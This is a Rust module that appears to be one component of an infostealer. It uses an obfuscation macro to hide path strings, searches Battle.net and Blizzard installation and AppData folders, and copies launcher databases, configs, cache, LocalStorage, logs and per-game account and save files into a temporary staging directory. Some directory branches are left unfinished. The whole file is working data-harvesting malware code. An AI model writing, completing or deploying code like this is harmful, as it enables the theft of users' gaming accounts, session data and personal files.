use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\BattleNet");
    std::fs::create_dir_all(&output_dir)?;

    let battlenet_paths = detect_battlenet_paths().await;
    
    for battlenet_path in battlenet_paths {
        extract_battlenet_data(&battlenet_path, &output_dir).await?;
    }

    Ok(())
}

async fn detect_battlenet_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let programdata = std::env::var(sprotect!("PROGRAMDATA")).unwrap_or_default();
    
    let battlenet_locations = vec![
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Battle.net")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Battle.net")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Blizzard Entertainment")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Blizzard Entertainment")),
        format!("{}{}", programdata, sprotect!("\\Battle.net")),
        format!("{}{}", programdata, sprotect!("\\Blizzard Entertainment")),
        sprotect!("C:\\Program Files\\Battle.net"),
        sprotect!("C:\\Program Files (x86)\\Battle.net"),
        sprotect!("C:\\Program Files\\Blizzard App"),
        sprotect!("C:\\Program Files (x86)\\Blizzard App"),
    ];

    for path_str in battlenet_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_battlenet_data(battlenet_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let battlenet_name = battlenet_path.file_name().unwrap_or_default().to_string_lossy();
    let battlenet_output = format!("{}{}{}", output_dir, sprotect!("\\"), battlenet_name.replace(".", "_"));
    std::fs::create_dir_all(&battlenet_output)?;

    extract_battlenet_configs(&battlenet_path, &battlenet_output).await?;
    extract_battlenet_cache(&battlenet_path, &battlenet_output).await?;
    extract_battlenet_logs(&battlenet_path, &battlenet_output).await?;
    extract_game_configs(&battlenet_path, &battlenet_output).await?;
    
    Ok(())
}

async fn extract_battlenet_configs(battlenet_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_files = vec![
        sprotect!("Battle.net.config"),
        sprotect!("Battle.net Launcher.exe.config"),
        sprotect!("Battle.net.exe.config"),
        sprotect!("config.wtf"),
        sprotect!("launcher.db"),
        sprotect!("product.db"),
    ];

    for config_file in config_files {
        let config_path = battlenet_path.join(&config_file);
        if config_path.exists() {
            let dest_path = format!("{}{}{}", output_dir, sprotect!("\\"), config_file.replace(".", "_"));
            fs::copy(&config_path, dest_path).ok();
        }
    }

    scan_for_battlenet_configs(battlenet_path, output_dir).await?;
    Ok(())
}

async fn extract_battlenet_cache(battlenet_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let cache_dirs = vec![
        sprotect!("Cache"),
        sprotect!("LocalStorage"),
        sprotect!("Logs"),
        sprotect!("Temp"),
    ];

    for cache_dir in cache_dirs {
        let cache_path = battlenet_path.join(&cache_dir);
        if cache_path.exists() {
            let cache_output = format!("{}{}{}", output_dir, sprotect!("\\"), cache_dir);
            copy_selective_battlenet_files(&cache_path, &cache_output).await?;
        }
    }

    Ok(())
}

async fn extract_battlenet_logs(battlenet_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let log_dirs = vec![
        sprotect!("Logs"),
        sprotect!("Errors"),
        sprotect!("Diagnostics"),
    ];

    for log_dir in log_dirs {
        let log_path = battlenet_path.join(&log_dir);
        if log_path.exists() {
            let log_output = format!("{}{}{}", output_dir, sprotect!("\\"), log_dir);
            copy_battlenet_logs(&log_path, &log_output).await?;
        }
    }

    Ok(())
}

async fn extract_game_configs(battlenet_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let game_dirs = vec![
        sprotect!("World of Warcraft"),
        sprotect!("Hearthstone"),
        sprotect!("Diablo III"),
        sprotect!("Diablo IV"),
        sprotect!("Overwatch"),
        sprotect!("StarCraft II"),
        sprotect!("Heroes of the Storm"),
        sprotect!("Call of Duty"),
    ];

    for game_dir in game_dirs {
        scan_for_game_data(battlenet_path, &game_dir, output_dir).await?;
    }

    Ok(())
}

async fn scan_for_battlenet_configs(dir: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_battlenet_config_file(&file_name) {
                    let dest_path = format!("{}{}{}", output_dir, sprotect!("\\"), file_name.replace(".", "_"));
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_battlenet_config_dir(&dir_name) {
                    let new_dest = format!("{}{}{}", output_dir, sprotect!("\\"), dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

async fn scan_for_game_data(base_dir: &PathBuf, game_name: &str, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let game_path = base_dir.join(game_name);
    if game_path.exists() {
        let game_output = format!("{}{}{}", output_dir, sprotect!("\\"), game_name.replace(" ", "_"));
        std::fs::create_dir_all(&game_output)?;

        if let Ok(entries) = fs::read_dir(&game_path) {
            for entry in entries.flatten() {
                let path = entry.path();
                
                if path.is_file() {
                    let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                    if is_game_config_file(&file_name) {
                        let dest_path = format!("{}{}{}", game_output, sprotect!("\\"), file_name);
                        fs::copy(&path, dest_path).ok();
                    }
                } else if path.is_dir() {
                    let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                    if is_game_config_dir(&dir_name) {
                        let new_dest = format!("{}{}{}", game_output, sprotect!("\\"), dir_name);
                        
                    }
                }
            }
        }
    }
    Ok(())
}

async fn copy_selective_battlenet_files(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_battlenet_important_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_battlenet_important_dir(&dir_name) {
                    let new_dest = format!("{}{}{}", dest_dir, sprotect!("\\"), dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

async fn copy_battlenet_logs(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_log_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let new_dest = format!("{}{}{}", dest_dir, sprotect!("\\"), dir_name);
                
            }
        }
    }
    Ok(())
}

fn is_battlenet_config_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let config_extensions = [sprotect!(".config"), sprotect!(".wtf"), sprotect!(".db"), sprotect!(".xml"), sprotect!(".json")];
    let config_keywords = [sprotect!("battle"), sprotect!("config"), sprotect!("setting"), sprotect!("launcher"), sprotect!("product")];
    
    config_extensions.iter().any(|ext| filename_lower.ends_with(ext)) &&
    config_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_game_config_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let config_extensions = [sprotect!(".wtf"), sprotect!(".lua"), sprotect!(".txt"), sprotect!(".cfg"), sprotect!(".ini"), sprotect!(".json")];
    let config_keywords = [sprotect!("config"), sprotect!("setting"), sprotect!("save"), sprotect!("user"), sprotect!("account")];
    
    config_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    config_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_log_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let log_extensions = [sprotect!(".log"), sprotect!(".txt"), sprotect!(".dmp")];
    
    log_extensions.iter().any(|ext| filename_lower.ends_with(ext))
}

fn is_battlenet_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".db"), sprotect!(".json"), sprotect!(".xml"), sprotect!(".config"), sprotect!(".wtf"), sprotect!(".log")];
    let important_keywords = [sprotect!("user"), sprotect!("account"), sprotect!("config"), sprotect!("setting"), sprotect!("battle"), sprotect!("cache")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_battlenet_config_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let config_dirs = [sprotect!("config"), sprotect!("setting"), sprotect!("data"), sprotect!("user")];
    
    config_dirs.iter().any(|dir| dirname_lower.contains(dir))
}

fn is_game_config_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let config_dirs = [sprotect!("wtf"), sprotect!("interface"), sprotect!("save"), sprotect!("config"), sprotect!("account")];
    
    config_dirs.iter().any(|dir| dirname_lower.contains(dir))
}

fn is_battlenet_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("cache"), sprotect!("storage"), sprotect!("data"), sprotect!("log"), sprotect!("config"), sprotect!("temp")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}